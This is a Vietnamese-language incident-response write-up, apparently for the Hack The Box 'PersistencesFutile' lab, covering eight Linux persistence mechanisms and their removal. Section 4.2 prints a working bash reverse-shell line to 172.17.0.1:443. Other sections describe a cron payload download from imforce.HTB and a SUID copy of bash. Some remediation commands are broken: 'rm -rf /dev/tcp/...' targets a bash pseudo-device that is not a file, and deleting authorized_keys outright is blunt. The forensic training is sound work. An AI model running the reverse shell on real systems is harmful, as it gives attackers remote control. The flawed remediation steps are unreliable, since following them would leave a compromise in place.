#  DFIR INCIDENT REPORT  
## Case: PersistencesFutile – Hack The Box

**Difficulty:** Medium  
**Category:** Linux Forensics / Incident Response  
**Incident Type:** Multi-Stage Persistence & Privilege Escalation  
**System:** Linux Production Server  
**Status:** Contained & Remediated  

---

## 1 Executive Summary

Một máy chủ Linux production được phát hiện đã bị xâm nhập và cài đặt **nhiều cơ chế backdoor và persistence** nhằm duy trì quyền truy cập trái phép. Hệ thống đã được cô lập khỏi Internet để tiến hành điều tra.

Quá trình DFIR xác định **8 cơ chế persistence khác nhau**, bao gồm:
- SUID binary độc hại
- Reverse shell
- Backdoor process
- Cron job
- SSH key trái phép
- Script leo thang đặc quyền
- Malware chạy nền
- Tài khoản hệ thống bị cấu hình sai quyền

Toàn bộ backdoor đã được **xác định, loại bỏ và xác minh thành công**.

---

## 2 Incident Scope & Impact

###  Tài nguyên bị ảnh hưởng
- Hệ thống Linux production
- Quyền root bị xâm phạm
- Khả năng remote access của attacker

###  Tác động
- Attacker có thể:
  - Kết nối ngược (reverse shell)
  - Leo thang đặc quyền
  - Duy trì persistence sau reboot
- Rủi ro chiếm quyền kiểm soát hoàn toàn hệ thống

---

## 3 Investigation Methodology

Quy trình DFIR được thực hiện theo các bước:
1. File system triage
2. Process & service analysis
3. Persistence mechanism hunting
4. Privilege escalation review
5. Account & credential audit
6. Remediation & validation

---

## 4 Findings & Evidence Analysis

###  4.1 SUID Backdoor Binary

- Phát hiện file `.backdoor` có quyền:
  `rwsr-xr-x (SUID root)`
- Cho phép thực thi với quyền root → **Critical**

**Remediation**
```bash
rm -rf .backdoor
```

---

###  4.2 Reverse Shell via Shell Configuration

- File `.bashrc` bị chỉnh sửa
- Payload:

```bash
bash -i >& /dev/tcp/172.17.0.1/443 0>&1
```

**Remediation**
```bash
rm -rf /dev/tcp/172.17.0.1/443
```

---

###  4.3 Backdoor Process (alertd)

- Phát hiện process lắng nghe port `4444`

**Remediation**
```bash
kill -9 <PID>
rm -rf alertd
```

---

###  4.4 Background Malware (connectivity-check)

- Malware chạy nền, không hợp lệ

**Remediation**
```bash
kill -9 <PID>
rm -rf connectivity-check
```

---

###  4.5 Malicious SUID Binaries

```bash
find / -perm -04000 2>/dev/null
```

- Xóa toàn bộ binary độc hại

---

###  4.6 Cron Job Persistence

- Script tải payload từ `imforce.HTB`
- Phát hiện:
  - `pyssh`
  - `access-up`

---

###  4.6.1 SSH Persistence (pyssh)

- SSH key trái phép trong:
  `/root/.ssh/authorized_keys`

**Remediation**
```bash
rm -rf /root/.ssh/authorized_keys
```

---

###  4.6.2 Privilege Escalation Script (access-up)

- Copy `/bin/bash`
- Set SUID `4755`

**Remediation**
```bash
rm -rf access-up
```

---

###  4.7 Nohup Persistence

- File `30-connectivity-check` chạy bằng nohup

**Remediation**
```bash
rm -rf 30-connectivity-check
```

---

###  4.8 Compromised System Account (gnats)

- UID:GID = `41:0`
- Shell: `/bin/bash`

**Remediation**
- GID → `41`
- Shell → `/usr/sbin/nologin`
- Disable password trong `/etc/shadow`

---

## 5 Validation & Recovery

```bash
/root/solveme
```

=> Hệ thống được xác nhận đã làm sạch

---

## 6 Root Cause Analysis

- Thiếu giám sát:
  - SUID binaries
  - Cron jobs
  - SSH keys
  - System users

---

## 7 MITRE ATT&CK Mapping

| Technique | ID |
|---------|----|
| Persistence | T1547 |
| Cron Job | T1053.003 |
| SUID Abuse | T1548.001 |
| SSH Keys | T1098.004 |
| Reverse Shell | T1059 |
| Privilege Escalation | T1068 |

---

## 8 Lessons Learned

- Persistence thường tồn tại **nhiều lớp**
- Phải kiểm tra toàn diện filesystem, process, user và scheduler

---

## 9 Conclusion

PersistencesFutile mô phỏng chính xác một kịch bản Incident Response thực tế trên Linux production. Việc loại bỏ thành công toàn bộ persistence chứng minh năng lực DFIR toàn diện từ phát hiện đến khôi phục hệ thống.
